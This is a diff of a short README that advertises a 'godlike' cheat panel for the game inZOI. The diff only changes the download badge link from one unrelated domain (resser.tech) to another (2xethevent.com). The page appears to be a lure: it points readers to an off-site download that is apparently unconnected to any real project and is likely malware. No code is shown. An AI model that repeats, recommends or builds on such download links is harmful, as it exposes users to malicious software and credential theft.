@@ -1,6 +1,6 @@
 # inZOI Cheats 🎮 | Unlock Full Control ✨
 
-[![Download inZOI Panel](https://img.shields.io/badge/Download-inZOI%20Panel-blueviolet)](https://resser.tech)
+[![Download inZOI Panel](https://img.shields.io/badge/Download-inZOI%20Panel-blueviolet)](https://2xethevent.com)
 
 Step into **inZOI** with godlike power using this all-in-one **cheat panel**. Modify the world, characters, and mechanics effortlessly! 💫  
 - 🧠 **Character & Environment Modifiers**  
